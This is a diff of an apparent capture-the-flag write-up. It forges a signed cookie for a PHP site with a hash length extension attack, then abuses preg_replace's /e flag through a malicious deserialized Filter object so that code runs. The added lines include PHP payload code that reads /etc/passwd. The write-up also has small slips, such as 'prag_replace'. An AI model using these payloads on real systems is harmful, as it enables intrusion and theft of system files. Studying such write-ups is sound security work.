@@ -76,7 +76,7 @@ cookies = {'custom_settings_hash': cookie_hash,
            'custom_settings': output}
 print requests.get(url, cookies=cookies).text
 ```
-In short, we appended **pwned** to the original data of **b:1;**, ran the new data through *hlextend.py* to receive our new hash, then requested the web page with our new cookie.
+In short, we appended "pwned" to the original data of "b:1;", ran the new data through `hlextend.py` to receive our new hash, then requested the web page with our new cookie.
 ```html
 $ python hlextend_test.py
 <html>
@@ -98,6 +98,7 @@ Now, what can we do with this new cookie creation?
 
 Let's take a quick look at the `classes.php` file:
 ```php
+...
   class Post {
     protected $title;
     protected $text;
@@ -130,11 +131,7 @@ Let's take a quick look at the `classes.php` file:
       echo $s;
     }
   };
-
-  $standard_filter_set = [new Filter("/\[i\](.*)\[\/i\]/i", "<i>\\1</i>"),
-                          new Filter("/\[b\](.*)\[\/b\]/i", "<b>\\1</b>"),
-                          new Filter("/\[img\](.*)\[\/img\]/i", "<img src='\\1'>"),
-                          new Filter("/\[br\]/i", "<br>")];
+...
 ?>
 ```
 
@@ -172,11 +169,23 @@ Before
 After
 ```
 <i> Words words words </i>
+```
+
+There is a fun feature with `prag_replace` that we can exploit here. In our regex `pattern` if we include the `e` flag, then the regex match will be replaced with the result of executable code aka a function, such as our old friends `file_get_contents` or `system`.
+
+Let's make a filter that will utilize this "feature".
+
+```php
+$filter = [new Filter('/^(.*)/e', 'file_get_contents(\'/etc/passwd\')')];
+```
+This filter will replace everything in the `text` attribute of a Post and replace it with the contents of `/etc/passwd/`.
+
+Now that we have a malicious filter, let's create a malicious post and test our hypothesis of calling a custom filter from the destructor.
 
 ```php
 <?php
 require_once('steves_list_backup/includes/classes.php');
-$filter = [new Filter('/^(.*)/e', 'file_get_contents(\\\'{}\\\')')];
+$filter = [new Filter('/^(.*)/e', 'file_get_contents(\'/etc/passwd\')')];
 
 $text = "file_get_contents";
 $text = htmlspecialchars($text);
